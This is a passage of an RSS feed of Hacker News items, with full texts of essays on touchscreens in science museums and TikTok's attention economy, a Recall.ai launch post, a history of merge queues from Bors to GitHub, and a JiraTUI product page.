much of an effect masking has. The correlation we got out of this handwavy
procedure is even somewhat close to the real number. To make sure, I transcribed
the plot into numbers, and R tells me the correlation is actually
0.29.55 Still not statistically significant at traditional levels.





“But it still looks like masking has an effect!!” It does. It’s just that if the
effect is there, it is small enough that we cannot statistically prove an effect
with just 44 dances. Assuming the coefficient of determination really is 5 %,
and we are aiming for a traditional significance level of 0.05, the sample size
curves tell us we would need over 80 dances to be sure of the effect of masking.


            ]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[I didn't bring my son to a museum to look at screens]]></title>
            <link>https://sethpurcell.com/writing/screens-in-museums/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45199931</guid>
            <description><![CDATA[When I was a kid in the ’80s, one of my two favorite places on Earth was The Franklin Institute (TFI) in downtown Philadelphia. We lived a couple hours away so a visit was a rare and precious thing. I think I only visited two or three times but it left an indelible impression on me. I remember wandering in amazement through its enormous spaces getting to actually play with amazing and interesting things. I remember sweeping off a table and then filling an overhanging funnel pendulum with sand, setting it going, and watching it create unexpected patterns on the table. I remember running through the gigantic model heart with other kids. I remember the overpowering joy of being in an actual monumental marble temple of curiosity and fascination. So I was filled with anticipation a couple weeks ago when, during a family trip to the East Coast, we managed to squeeze in a visit to TFI with our six-year-old son.]]></description>
            <content:encoded><![CDATA[ When I was a kid in the ’80s, one of my two favorite places on Earth was The Franklin Institute (TFI) in downtown Philadelphia. We lived a couple hours away so a visit was a rare and precious thing. I think I only visited two or three times but it left an indelible impression on me. I remember wandering in amazement through its enormous spaces getting to actually play with amazing and interesting things. I remember sweeping off a table and then filling an overhanging funnel pendulum with sand, setting it going, and watching it create unexpected patterns on the table. I remember running through the gigantic model heart with other kids. I remember the overpowering joy of being in an actual monumental marble temple of curiosity and fascination. So I was filled with anticipation a couple weeks ago when, during a family trip to the East Coast, we managed to squeeze in a visit to TFI with our six-year-old son.
We parked and ran in, paid close to ninety bucks (ouch! but I love you, so take my money), and started off on the top floor with the Wondrous Space exhibit.
And were met with screens.
Design your own rocket! it said (or something like that). No, I thought, this isn’t designing a rocket, this is playing a lame video game on a touchscreen. Yes, there were space-related artifacts around the walls, and a spacesuit in its own large case, but you couldn’t touch any of this stuff, you couldn’t play with it, you could just look at it for a few seconds, read the placard, say “huh”, and maybe point out some interesting feature to the kiddo.
But the screens were given pride of place, dead center in the dimly-lit space. And so they beckoned. My wife — a science writer who used to be the only staff writer covering space for New Scientist and before that, worked at NASA — poked at one of these with my son, added too many boosters to their launch vehicle, and were told it failed “for reasons” in a way she found totally unhelpful and pointless. She led our son gently but firmly away to the glorious four-story Foucault pendulum which hangs in a stairwell.
Here are some images from the website showing patrons interacting with (or running past) screens so you can see what I’m talking about:



But the screens were all over the place. There were on the main floor, in another section of Wondrous Space, and in the Body Odyssey exhibit. They were all over the SportsZone exhibit on the top floor. Many of them are connected to body motion sensors a la Xbox Kinect so you don’t need to touch them, but they’re still just video games, where the action-response feedback loop is provided by software, not the universe itself.
And the wonderful hands-on physical stuff that I loved as a kid? Jammed into out-of-the-way spaces in the Sir Isaac’s Loft and Air Show rooms. These rooms are terrific, and I was delighted to see they were absolutely packed with kids playing with stuff. No screens, just objects and forces — you don’t even need to read anything to enjoy many of the exhibits, such as the one where you sit in one of two chairs hanging from different configurations of block-and-tackle and haul yourself up — and then just let yourself drop, cushioned by a damping piston. Tucked far away in a desolate corner by a hallway we discovered an engaging exhibit where you pluck rods with your finger to generate Lissajous curves from the vibrations. My son was fascinated; he had never seen anything behave like that. And in the Air Show room he liked many of the exhibits, like the one where you (apparently) evacuate a cylinder to see the effect that has on objects moving through it (versus a control). And the “shimmer wall”, where kids generate sound waves using a variety of devices and can then see the sound waves impacting on a reflective and reactive surface was wonderful and really conveys the mechanical nature of sound.
But these physical exhibits require maintenance, and I was dismayed to see that several are in bad repair; some of them weren’t even working anymore, some seemed worn out, or didn’t seem well-designed to begin with. For instance, they have the classic “bicycle wheel and rotating stool” gyro effect demonstration, but the wheel was too large a diameter for my son to hold, and the stool seemed to have too much friction to work properly for my wife. There was no one trying to use it before or after us; I’d be curious to see the data on how many visitors attempt it, and how well it usually works for them. And that one should be trivial to design and implement properly: for crying out loud, our local ice cream shop has stools that spin on ball bearings, and I think that would be a big improvement. Every time something didn’t work right I couldn’t help thinking: we paid almost ninety bucks to visit this place. TFI doesn’t seem poor; it seems like its budgetary priorities lie elsewhere.
And where it looks like the budget has been going are the screen rooms. They occupy the huge central spaces on the main floor of the museum, and I’m sure a lot of time, money, and passion went into these things. But it’s misguided.
I believe museums exist to present the real thing for the visitor to experience with their own senses. Here’s the sculpture — the actual piece of stone, two thousand years old, Greek sculptor unknown — now go ahead and form your impressions. Come back to it when you’re an old man or woman, it will still be here, and you will see it with different eyes. This is a tiny but, to me, beautiful part of the human condition. And what made the Franklin Institute so amazingly special to me as a kid was that the exhibits sat at the intersection of things that kids want to play with, things that kids are allowed to play with, and things that demonstrate some “hey, that’s cool!” scientific phenomenon. And it was all real.
But a lame video game? I can do that on my goddamn phone. TFI “was one of the first museums in the nation to offer a hands-on approach to learning about the physical world”, but — and I can’t emphasize this enough, it’s my whole reason for writing this — touchscreens are not actually hands-on. Digital representations aren’t tangible, and touchscreen experiences just don’t activate a kid’s brain (including, I’d say, a sense of delight) the same way a genuinely hands-on experience, like pulling hard on a rope to raise your chair, does.
I don’t know why museums are doing this; my idle speculation is that they see themselves as competing with screens for attention, so in a kind of experiential race to the bottom, they feel compelled to bring screens into their exhibits (see: Amusing Ourselves to Death). But now more than ever in history, kids need a break from the screens that all too many of them are sadly often plugged into by default, and connection to the real world instead. Now is the time for TFI — and all museums — to take a stand against the tidal wave of digital garbage that is consuming humanity, especially kids, by eliminating all of their touchscreen “exhibits”.
To be fair, TFI is still pretty damn great if you just ignore all the screens. The Franklin Memorial rotunda (free to visit!) is gorgeous. The hands-on stuff, tucked away and apparently suffering from neglect though it is, should be replicated in every city in the world. But it would be so much better if they removed all the screens and put that budget and real estate toward the real, tangible, interactive science exhibits that were the reason the museum was created in the first place, and what made me love it as a child. ]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[TikTok has turned culture into a feedback loop of impulse and machine learning]]></title>
            <link>https://www.thenexus.media/tiktok-won-now-everything-is-60-seconds/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45199760</guid>
            <description><![CDATA[As of September 2025, approximately 170 million Americans spend, on average, one hour every day in an app that is designed to maximize psychological grip. While Congress fixates on TikTok’s data collection usages, what hasn’t received enough attention is how the platform has successfully industrialized human attention itself. Where earlier media relied on polished narratives (films with arcs, shows with seasons), TikTok turned culture into a never-ending feedback loop of impulse and machine lear]]></description>
            <content:encoded><![CDATA[
        Photo by Solen Feyissa on UnsplashAs of September 2025, approximately 170 million Americans spend, on average, one hour every day in an app that is designed to maximize psychological grip. While Congress fixates on TikTok’s data collection usages, what hasn’t received enough attention is how the platform has successfully industrialized human attention itself. Where earlier media relied on polished narratives (films with arcs, shows with seasons), TikTok turned culture into a never-ending feedback loop of impulse and machine learning.TikTok didn’t invent short videos or algorithmic feeds, though. Vine created looping six-second clips in 2013, YouTube has used recommendations for over a decade, Instagram rolled out Stories in 2016, and MTV conditioned audiences to rapid cuts long before any of them. What TikTok did was fuse these scattered experiments into a full-scale system for harvesting attention. Most platforms’ “For You” pages are far less finely tuned. They adjust slowly, learning from signs like likes, follows, or finished videos. TikTok's algorithm learns instantly from micro-behaviors. You can nuke your feed in minutes just by deliberately watching only one type of video—say, pottery clips or capybara memes. That’s because the algorithm heavily weights engagement signs per video rather than long-term user profiles. Public documentation and leaked papers suggest TikTok may also track micro-behaviors such as how long users hover before swiping away. This results in a recommender system that feels uncannily perceptive.However, before today, each medium we’ve invented reshaped how we think and consume information. The printing press trained readers in linear, sequential thought, encouraging sustained focus and complex argumentation. Television created visual storytelling and shared cultural moments, with families watching the same shows at the same time and building collective references. The internet introduced hyperlinked thinking, enabling rapid information switching, comparison of perspectives, and knowledge-building through exploration.Now, the world is picking up on the TikTok model.News organizations like The Washington Post have invested in and expanded a dedicated TikTok team since 2019, producing short and snappy newsroom videos that regularly go viral. In education, students are struggling with assignments longer than a few minutes and expect information delivered in rapid, visually engaging bursts. In entertainment, traditional stand-up comedy builds tension over minutes before a punchline, but TikTok comedians deliver the absurd immediately — a person discovering their roommate has been using their toothbrush as a cleaning brush — and increasingly structure shows around "clippable moments" designed to go viral. Song introductions have shortened dramatically, with one study finding average intros fell from more than 20 seconds in the 1980s to just five, while movie trailers increasingly resemble TikTok compilations: rapid-fire montages of action sequences and emotional beats rather than traditional narrative setups.Cultural consumption itself has also become a form of algorithmic training. Instead of browsing Netflix and choosing what to watch, users scroll TikTok to see what the algorithm predicts. This means that you're not consuming culture; you're teaching a machine how to feed you culture more efficiently.TikTok also rewards hyper-specialization. Entire followings are built on carpet-cleaning videos, paint-mixing shots, or the same dance repeated in new locations. Success comes less from broad talent or universal appeal than from perfecting a narrow niche optimized for the algorithm. In other words, creators who identify and double down on the smallest engagement signals are algorithmically incentivized to specialize, turning micro-content into a precise science of attention capture. This hyper-optimization emerged in markets where dozens of apps competed brutally for user attention. Platforms that kept people engaged survived; the rest died. That evolutionary pressure produced increasingly sophisticated ways to capture attention, and the most successful apps learned to treat human psychology like an engineering problem to be solved through data and iteration.As American platforms adopt TikTok-style optimization, the format sets expectations for all digital content. Micro-optimization techniques are spreading worldwide, establishing a new standard for how human attention is structured algorithmically. TikTok delivers exactly what we want: immediate satisfaction, personalized content, and endless novelty. But efficiency always involves trade-offs. We gain instant access to exactly the content that triggers our reward systems, but we lose the ability to be bored, to sit with incomplete thoughts, to wrestle with ideas that don't immediately pay off. We lose the serendipity of discovering things we didn't know we wanted.Are we making this trade consciously? Most users have never considered that their scrolling patterns are training an algorithm, or that their entertainment has been optimized for maximum psychological grip rather than maximum meaning.The irony, of course, is that if you've read this far, it may mean you’ve already mastered a rare skill: sustained attention in a world of distraction.Subscribe to get weekly insights on China's tech culture that Western media misses.
      ]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[ChatGPT Developer Mode: Full MCP client access]]></title>
            <link>https://platform.openai.com/docs/guides/developer-mode</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45199713</guid>
        </item>
        <item>
            <title><![CDATA[Launch HN: Recall.ai (YC W20) – API for meeting recordings and transcripts]]></title>
            <link>https://news.ycombinator.com/item?id=45199648</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45199648</guid>
            <description><![CDATA[Hey HN, we're David and Amanda from Recall.ai (https://www.recall.ai). Today we’re launching our Desktop Recording SDK, a way to get meeting data without a bot in the meeting: https://www.recall.ai/product/desktop-recording-sdk. It’s our biggest release in quite a while so we thought we’d finally do our Launch HN :)]]></description>
            <content:encoded><![CDATA[Hey HN, we're David and Amanda from Recall.ai (https://www.recall.ai). Today we’re launching our Desktop Recording SDK, a way to get meeting data without a bot in the meeting: https://www.recall.ai/product/desktop-recording-sdk. It’s our biggest release in quite a while so we thought we’d finally do our Launch HN :)Here’s a demo that shows it producing a transcript from a meeting, followed by examples in code: https://www.youtube.com/watch?v=4croAGGiKTA . API docs are at https://docs.recall.ai/.Back in W20, our first product was an API that lets you send a bot participant into a meeting. This gives developers access to audio/video streams and other data in the meeting. Today, this API powers most of the meeting recording products on the market.Recently, meeting recording through a desktop form factor instead of a bot has become popular. Many products like Notion and ChatGPT have added desktop recording functionality, and LLMs have made it easier to work with unstructured transcripts. But it’s actually hard to reliably record meetings at scale with a desktop app, and most developers who want to add recording functionality don’t want to build all this infrastructure.Doing a basic recording with just the microphone and system audio is fairly straightforward since you can just use the system APIs. But it gets a lot harder when you want to capture speaker names, produce a video recording, get real-time data, or run this in production at large scale:- Capturing speaker names involves using accessibility APIs to screen-scrape the video conference window to monitor who is speaking at what time. When video conferencing platforms change their UI, we must ship a change immediately, so this keeps working.- Producing a video recording that is clean, and doesn’t capture the video conferencing platform UI involves detecting the participant tiles, cropping them out, and compositing them together into a clean video recording.- Because the desktop recording code runs on end-user machines, we need to make it as efficient as possible. This means writing highly platform-optimized code, taking advantage of hardware encoders when available, and spending a lot of time doing profiling and performance testing.Meeting recording has zero margin for failure because if anything breaks, you lose the data forever. Reliability is especially important, which dramatically increases the amount of engineering effort required.Our Desktop Recording SDK takes care of all this and lets developers build meeting recording features into their desktop apps, so they can record both video conferences and in-person meetings without a bot.We built Recall.ai because we experienced this problem ourselves. At our first startup, we built a tool for product managers that included a meeting recording feature. 70% of our engineering time was taken up by just this feature! We ended up starting Recall.ai to solve this instead. Since then, over 2000 companies use us to power their recording features, e.g. Hubspot for sales call recording, Clickup for their AI note taker. Our users are engineering teams building commercial products for financial services, telehealth, incident management, sales, interviewing, and more. We also power internal tooling for large enterprises.Running this sort of infrastructure has led to unexpected technical challenges! For example, we had to debug a 1 in 36 million segfault in our audio encoder (https://www.recall.ai/blog/debugging-a-1-in-36-000-000-segfa...), we encountered a Postgres lock-up that only occurs when you have tens of thousands of concurrent writers (https://news.ycombinator.com/item?id=44490510), and we saved over $1M a year on AWS by optimizing the way we shuffle data around between our processes (https://news.ycombinator.com/item?id=42067275).You can try it here: https://www.recall.ai. It's self-serve with $5 of free credits. Pricing starts at $0.70 for every hour of recording, prorated to the second. We offer volume discounts with scale.All data recorded through Recall.ai is the property of our customers, we support 0-day retention, and we don’t train models on customer data.We would love your feedback!]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[The Origin Story of Merge Queues]]></title>
            <link>https://mergify.com/blog/the-origin-story-of-merge-queues</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45199378</guid>
            <description><![CDATA[From Bors and Homu to Bulldozer, Kodiak, Mergify, and now GitHub and GitLab, merge queues have shaped how we keep main branches green. This article traces their history, why they emerged, and how they became a standard in modern software development.]]></description>
            <content:encoded><![CDATA[From Bors and Homu to Bulldozer, Kodiak, Mergify, and now GitHub and GitLab, merge queues have shaped how we keep main branches green. This article traces their history, why they emerged, and how they became a standard in modern software development.If you use GitHub or GitLab today, merge queues feel like a built-in feature of modern development. But their story goes back over a decade, long before "merge queue" was a product term.It started with a simple problem: How do you keep your main branch green when dozens of developers are merging code simultaneously? Continuous integration clarified that "just merge and hope" wasn't good enough. The solution wasn't a new testing framework but a new workflow.From early scripts in the Rust project (Bors, Homu) to Shopify's Shipit, to modern SaaS offerings like Mergify and built-in queues from GitHub and GitLab, merge queues evolved out of necessity. What began as side-project bots has become a standard practice for engineering teams at scale.This post walks through that history — the motivations, the people behind it, and how these tools shaped the way we merge code today.The "Not Rocket Science" Rule and Early ExperimentsThe idea of a merge queue – automatically ensuring that a main branch is never broken by merged changes – can be traced back over two decades. In the early 2000s, developer Ben Elliston devised a system of cron jobs, multiple repositories, and a database to "automatically maintain a repository of code that always passes all the tests". This approach, later dubbed the "Not Rocket Science Rule of Software Engineering," kept a known-good code branch for developers and customers, preventing the headaches of broken main builds.Fast forward to 2013: Graydon Hoare (creator of the Rust language) faced a similar challenge as Rust's contributor base grew. Remembering Elliston's rule, Hoare implemented a small bot named Bors to enforce it. Bors integrated with Rust's build farm and GitHub: it would monitor pull requests, wait for a reviewer's "approve" command, merge the PR into a temporary branch, and run the full test suite. If tests passed, Bors would fast-forward the main branch to that tested merge commit; if not, it would report the failure and leave the main branch untouched. This ensured that Rust's master branch was always green (always passing tests). The motivation was to avoid "merge skew," where changes appear compatible when reviewed in isolation but break once merged into an updated main. (A classic example of merge skew is two PRs that individually pass tests – one renames a function, and another adds a call to the old name, resulting in a broken main after sequential merges). By "testing it first, then promoting it" to main, Bors kept Rust's primary branch stable without human intervention to update or revert commits.Rust's experience proved the concept's value. As Hoare noted, the approach "is not rocket science" – it's just tedious to do manually, hence ripe for automation. Bors' success meant that by 2014 the Rust and Mozilla Servo projects were using such bots to gate all merges on tests. However, Bors itself was a quick script, and the need for a more extensible solution soon became apparent.Rust's Homu and the Rise of Merge BotsTo build a more general tool, Rust contributor Barosl Lee created Homu as a reimplementation and extension of the original Bors bot. Homu was designed to be generic (not Rust-specific) and easier for others to adopt. It implemented the same core idea: maintain a tested integration branch (often called "auto") that includes pending PRs, and only fast-forward main to auto when tests on auto pass. In practice, Homu reversed the usual merge process: instead of merging a PR then testing, it tested the PR before it landed on main by temporarily combining it with the up-to-date main branch. This ensured that "the main branch is always a copy of auto that passed all tests, processing approved PRs one at a time in order.Homu was open source and quickly became integral to Rust's workflow (Rust's own Homu instance was named "bors"). In 2015, Barosl even launched Homu as a service (homu.io), making it easy for other open-source projects to use a hosted merge queue bot. This service gained users in various communities, demonstrating a broader demand for maintaining green main branches. Homu's design was language-agnostic, so projects beyond Rust/Servo could adopt it with their CI systems.However, by around 2018, the original Homu service began to stagnate. The maintainer stopped updating it, the web frontend's source was lost, and eventually the homu.io domain expired. Some projects (like Rust itself) forked and maintained their own Homu instances, but there was clearly room for a modern replacement. This set the stage for the next evolution of merge queue tools.Bors-NG: Modern Successor to HomuEnter Bors-NG (Bors "Next Generation"), created by Michael Howell. Bors-NG was a complete open-source replacement for Homu, first released around 2017. It was built to be faster, more user-friendly, and easier to host, while preserving the same core idea of tested-then-merged pull requests. Unlike homu.io, Bors-NG had no closed-source components – the public instance at app.bors.tech ran the same code that anyone could self-host.Bors-NG quickly became popular, especially for teams on GitHub that needed a merge queue before GitHub offered any native solution. Many saw it as the "spiritual successor to Homu, the original Rust merge bot". It integrated with GitHub pull requests and CI services, allowing maintainers to use the familiar bors r+ command to enqueue PRs for merging once tests pass. For years, this combo of Bors-NG + CI filled a critical gap, giving projects large and small a way to avoid merge skew and keep their main branch healthy.Notably, the Kubernetes project developed a similar concept in parallel – their Prow/Tide system – and other communities like OpenStack had long used a gating bot (Zuul) for Gerrit. These all share the same philosophy pioneered by Bors. Merge queues became recognized as best practice for high-velocity projects where broken merges are unacceptable.By 2023, however, the landscape changed: GitHub announced its own merge queue feature (more on that later). The author of Bors-NG announced the public Bors-NG service would be deprecated in favor of GitHub’s native Merge Queue. While Bors-NG remains open source for self-hosters, the availability of an official tool signaled a shift. It was a full-circle moment – a concept that started as a community hack had become mainstream enough for GitHub itself to support it out-of-the-box.Industry Solutions: Bulldozer, Mergify, and KodiakIn parallel to the Rust community's bots, other engineers and companies were solving the same problem, often "scratching their own itch." This gave rise to several notable merge automation tools in the late 2010s:Bulldozer (2017): Developers at Palantir created Bulldozer as a GitHub App to automate merging and updating PRs. Palantir open-sourced the tool, which could be self-hosted or installed on repos. Bulldozer automatically merges pull requests when all required checks and reviews are satisfied, and it can also auto-update PR branches to keep them in sync with the base branch. Essentially, it removes the manual "update and merge" drudgery in a fast-moving trunk-based development workflow. An example use case is at ACV Auctions, where engineers adopted Palantir's Bulldozer to ensure everyone's feature branch stays up-to-date with main and merges immediately once tests pass (They noted that for public GitHub usage, Bulldozer could be run as a custom instance, as it wasn't officially listed on the marketplace at the time)Mergify (2018): That's us! Frustration with manual PR management led Julien Danjou and Mehdi Abaakouk to build a small merge automation tool for their team in 2018. That side project struck a chord and soon evolved into Mergify, a full-fledged SaaS product and company. Mergify introduced features to queue, update, and merge PRs with flexible rules, effectively bringing merge queues to any GitHub repository via a cloud service. The founders (long-time open source contributors) initially open-sourced Mergify's code and offered it free for OSS projects. Over the years, Mergify became a popular "CI companion" for teams worldwide, offering advanced queue configurations, priority rules, batch merging, and more on top of GitHub's API. It was essentially "merge queue as a service," well before GitHub's native feature. (As an aside, Mergify's engine was eventually made closed-source in 2022 as the business matured, but it continues to serve thousands of developers.)Kodiak (2019): In early 2019, developer Christopher Blump faced constant delays from having to rebase and update PRs in a busy repo with an always-green main policy. He evaluated existing tools like Bulldozer and others, even contributing a patch, but found "none of the existing projects… solved the problem of efficiently updating and merging pull requests." So during his college finals in May 2019, he built the first version of Kodiak. Kodiak is an open-source GitHub App that automates the “update with latest main and merge if tests pass" dance. It introduced a proper queue to merge PRs in order, eliminating the race condition when multiple developers try to merge at once. The initial version was basic (queue in memory, no persistent state) but solved the pain point. By that summer, Kodiak’s usefulness caught on – it got a considerable boost when Vercel’s CEO tweeted about using it to auto-merge and deploy changes. This endorsement in July 2019 brought a wave of adopters, and Kodiak rapidly grew via word-of-mouth in the open-source community. Kodiak added features like configuration files, persistent queues, and GitHub checks for transparency. It became another popular option for teams wanting a hosted merge bot, though it is not actively maintained anymore.These tools all shared a common purpose: to safely remove human bottlenecks in merging PRs. They watched for PRs meeting defined conditions (CI passes, approvals present, specific labels, etc.) and then automatically merged them in a controlled way. Many could also keep branches rebased or updated to prevent stale merges. In effect, they implemented merge queues or merge trains outside of the platform – a testament to how universal the need had become by 2018–2019.It's worth noting that GitLab users were also early to this idea: GitLab introduced an official Merge Trains feature in mid-2019 (GitLab Premium 12.0) to queue merge requests and run "pipelines for merge results" on each in sequence. This was GitLab's integrated solution to guarantee that each MR is tested with all prior changes before landing, much like Bors/Homu's approach. Merge Trains made it easy to auto-merge a series of MRs without breaking the target branch, and even supported batching multiple MR commits into one pipeline run for efficiency. In other words, by 2019 the concept of merge queues had leapt from niche bots to built-in VCS platform features – at least on GitLab.Internal Merge Queues in Tech GiantsLarge-scale organizations soon recognized that hand-rolling merge queues was often the only way to keep their main branches stable amid heavy developer activity. Uber, for instance, built a system called SubmitQueue to verify and land changes in their monorepo, reducing CI wait times by 74% and dramatically improving merge throughput while keeping the mainline green. Shopify, working on a massive Rails-based monolith, added a merge queue into their deployment tool, Shipit, to prevent accidental merges during backlog surges and maintain pipeline reliability. Similarly, Strava created an internal tool dubbed Butler, a CI-integrated merge queue that enforces orderly merging for their fast-moving engineering teams.At Shopify, developers gave positive feedback early on: “By getting automation involved earlier in the pipeline, we were able to take some of the load off our developers, make them happier, and more productive.” In fact, over 90% of pull requests to Shopify’s core application now use the Shipit Merge Queue. This demonstrates how merge queues aren’t just technical enablers—they improve engineering experience at scale.Mainstream Adoption: GitHub's Merge QueueGiven the success of these systems, it was perhaps only a matter of time before GitHub provided native support. Historically, GitHub's stance was more manual: they added a basic "Auto-merge" option in late 2020 that lets a PR merge after checks pass. However, that still didn't handle multiple PRs interacting or ensure rebasing. The true paradigm shift came in 2022–2023.GitHub’s own Merge Queue wasn’t born from product planning—it was born from internal necessity. By 2016, GitHub engineers were merging nearly 1,000 pull requests per month into their expansive monorepo. The resulting chaos mandated a smarter system. What emerged was the concept of a "train" — a bundle of PRs tested, deployed, and merged together under human orchestration. This was a precursor to today's fully automated queues. An internal shift began in 2020, when multiple teams pooled efforts to streamline PR merging across internal projects. By mid-2021, GitHub piloted a merge queue in smaller repos and, by 2023, had rolled out an internal system powering thousands of merges monthly—cutting average wait times by 33% and calling the Merge Queue "one of the best quality-of-life improvements" they'd seenThen, GitHub decided to release its internal merge queue as part of its product. They began experimenting with a first-party Pull Request Merge Queue (PRMQ). After a closed beta, in February 2023, GitHub released its merge queue feature in public beta, and by July 2023, it was generally available.GitHub's Merge Queue closely mirrors the principles established by Bors and others: it maintains a queue of PRs waiting to merge. It ensures each PR is tested in a merged state (often by creating a temporary merge branch for the PR and running CI) before it lands on the base branch. In effect, it automates the formerly tedious process of constantly rebasing or updating PRs and serializing their merges. As GitHub's announcement put it, developers used to have to update their feature branches one-by-one and re-run CI to avoid breaking main; "Merge Queue automates this process" by queuing PRs and testing them with any earlier queued changes. The result is higher velocity and confidence that incompatible changes never break the default branch.The introduction of GitHub's own merge queue was a watershed moment. It validated the approach pioneered by community tools and brought it to a much broader audience. Organizations on GitHub Enterprise Cloud or public open-source projects can now simply toggle on a merge queue in settings, without needing an external bot. The impact was immediately felt: maintainers of Bors-NG announced the phase-out of their hosted service in favor of GitHub's queue, and guidelines for migrating from Bors to GH Merge Queue emerged. Essentially, the ecosystem came full circle – what started as a custom script to enforce an "always-green" rule evolved into a standard platform feature.It's important to note that GitHub's initial implementation has some differences in workflow. For example, GH Merge Queue uses a two-phase testing approach (one run on the PR itself, and a second run after queueing when merged into a temporary branch) whereas tools like Bors performed a single integrated test cycle. There are also limitations: among others, GitHub's queue is FIFO only (no priority reordering) and lacks batch merging capabilities. Third-party services like Mergify have pointed out these gaps quickly, since their products offer more advanced queue configurations (multiple queues, priority rules, batching to merge several PRs at once, etc.). In fact, even after GitHub's native queue launch, some teams continued to use or switch to tools like Mergify or others for more flexibility. Nonetheless, the core need is now officially recognized and supported by GitHub, a significant milestone in the history of merge queues.Conclusion: From Niche Scripts to Essential WorkflowIn a little over a decade, merge queue systems have gone from an obscure hack to an essential part of modern software delivery. The progression tells a story of increasing scale and quality demands:Early 2010s: Only very large or risk-averse projects (like Rust, Servo, or OpenStack) felt the pain strongly enough to build bespoke solutions (Bors, Homu, Zuul) to guarantee unbreakable main branches. These were novel, community-driven efforts born out of necessity – enforcing the "always passes all tests" rule that was known but rarely automated.Late 2010s: As continuous integration became ubiquitous and teams adopted trunk-based development, the merge skew problem became more common across the industry. This spurred a wave of tools – some open-source, some commercial – to automate PR merging (Bulldozer, Mergify, Kodiak, and others). They enabled even smaller teams to achieve what only giants could before: continuously integrating code without constantly babysitting CI or worrying about conflicting changes. The fact that a lone developer could write Kodiak in a weekend to solve his team's annoyance, and that it immediately found a user base, speaks to how widespread the need had become.2020s: Merge queues became mainstream best practice. Platform support (GitLab's Merge Trains, GitHub's Merge Queue) lowered the barrier to adoption. Today, even teams that never heard of "bors" or "homu" are benefiting from the lessons those tools taught. On GitHub, you can simply enable a branch protection that uses a merge queue, and achieve the same guarantee that “the main branch is never broken by incompatible changes.” The ecosystem around merge automation is still evolving – with third-party services pushing the envelope on features – but the fundamental approach is here to stay.In an academic sense, it's fascinating how a principle from the early 2000s configuration management became a pillar of modern DevOps. The story of merge queue systems is one of increasing automation to support software quality at scale. By eliminating the integration risk of each incremental change, developers can move faster without fear.What began as Graydon Hoare's small Rust bot named after a knight (Bors) has grown into a standard tool in software teams' arsenal, ensuring that code integration is "not rocket science" but a well-engineered process. Merge queues have evolved from niche hacks into an industry standard—because as PR velocity increased, they weren't a luxury, they became an operational necessity.]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Zoox robotaxi launches in Las Vegas]]></title>
            <link>https://zoox.com/journal/las-vegas</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45199031</guid>
            <description><![CDATA[Ride in Zoox’s purpose-built autonomous robotaxi. Now serving Las Vegas. Download the app and ride in a Zoox.]]></description>
            <content:encoded><![CDATA[Copyright Zoox, Inc. 2025All Rights Reserved.]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Jiratui – A Textual UI for interacting with Atlassian Jira from your shell]]></title>
            <link>https://jiratui.sh/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45198481</guid>
            <description><![CDATA[JiraTUI revolutionizes task management for developers by enabling seamless interaction with Jira from the terminal. Create, update, and track tasks efficiently, all while maintaining focus on your code and workflow.]]></description>
            <content:encoded><![CDATA[
      
        
      

      
            
            JiraTUI revolutionizes task management for developers by enabling seamless interaction with Jira from the terminal. Create, update, and track tasks efficiently, all while maintaining focus on your code and workflow.
          


      
        
        
      

      
          
            Features
          
          
            
                  
                  
                  
                  
                
            
              Search Tasks
              Quickly locate your Jira tasks using the powerful search functionality in JiraTUI. With just a few commands, you can filter tasks by status, assignee, or priority. This feature saves time and enhances productivity, allowing you to focus on what matters most in your projects.
            
          
          
            
            
            
              Create Tasks
               Easily create new Jira tasks directly from the terminal with JiraTUI. This feature simplifies the task creation process, enabling you to specify details like title, description, and priority in a streamlined manner. Spend less time navigating interfaces and more time getting things done.
            
          
          
            
                  
                  
                  
                  
                
            
              Update Tasks
              Keep your tasks up to date effortlessly with JiraTUI's update feature. Modify task details such as status, assignee, summary, labels and due dates directly from the command line. This functionality ensures that your project remains organized and current, enhancing collaboration and workflow efficiency.
            
          
          
            
            
            
              Comments
              Engage with your team by managing comments on tasks through JiraTUI. Add or delete comments directly from the terminal, fostering clear communication and collaboration. This feature helps keep discussions organized and accessible, ensuring everyone stays informed about task progress.
            
          
          
              Manage Related Tasks
              Easily manage related tasks with JiraTUI, allowing you to link and unlink tasks directly from the terminal. This feature helps you visualize dependencies and relationships between tasks, ensuring a more cohesive project management experience and improving overall workflow.
            
          
            
                  
                  
                  
                  
                
            
              JQL Search
              Leverage the power of Jira Query Language (JQL) with JiraTUI to perform advanced searches. This feature allows you to create complex queries to filter tasks based on specific criteria, providing greater flexibility and precision in managing your projects and enhancing your productivity. Expressions can be saved to use at any time.
            
          
        

      
          Advantages
          Discover the key advantages of JiraTUI that make it an essential tool for developers seeking efficient and effective task management.
          
            
                  
                    
                  
                  Configurable
                  JiraTUI is highly configurable, allowing users to tailor the tool to their specific needs. Customize command shortcuts, settings, and preferences to create a personalized experience that enhances productivity. This flexibility ensures that JiraTUI adapts to your workflow, making it a perfect fit for any development environment.
                
            
                  
  

                  Simplicity
                  JiraTUI offers a straightforward command-line interface that simplifies task management. By eliminating unnecessary clicks and navigation, it allows developers to focus on their work. The intuitive commands make it easy to perform actions quickly, ensuring that managing Jira tasks is a seamless part of your development workflow.
                
          
          
            
                  
                    
                    
                  
                  Speed
                  Experience unparalleled speed with JiraTUI, designed for efficiency in task management. The command-line interface allows for rapid execution of commands, enabling developers to create, update, and search tasks in seconds. This speed not only saves time but also enhances overall productivity, allowing you to focus on delivering quality work.
                
            
                  
  

                  Easy to Use
                  JiraTUI is designed with user-friendliness in mind, making it accessible for developers of all skill levels. The clear command structure and helpful prompts guide users through task management effortlessly. With minimal learning curve, you can quickly harness the power of JiraTUI and integrate it into your daily workflow.
                
          
        

      
            
            © 2025 Gaston Tagni.
            
            
          

    ]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[We can’t circumvent the work needed to train our minds]]></title>
            <link>https://zettelkasten.de/posts/the-scam-called-you-dont-have-to-remember-anything/</link>
